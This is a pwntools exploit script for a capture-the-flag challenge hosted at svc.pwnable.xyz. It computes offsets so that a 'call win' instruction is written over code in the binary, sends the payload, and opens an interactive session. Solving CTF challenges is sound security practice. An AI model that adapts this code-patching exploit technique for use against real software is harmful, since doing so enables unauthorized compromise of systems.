from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30029

gdbscript = """
set follow-fork-mode child
b *main+0x94
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()

    call_win = (exe.symbols.win - exe.symbols.main - 153) << 8 | 0xe8
    call_exit = -(exe.symbols.result - exe.symbols.main - 148) // 8
    
    payload = f"{call_win ^ 1} 1 {call_exit}"
    
    r.sendline(payload.encode())
    r.sendline(b"0 0 0")
    
    r.interactive()

if __name__ == "__main__":
    main()
